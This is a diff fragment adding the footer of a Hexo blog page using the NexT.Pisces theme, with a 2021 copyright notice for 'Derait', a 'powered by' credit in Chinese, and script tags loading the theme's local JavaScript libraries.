+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2021-08 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Derait</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
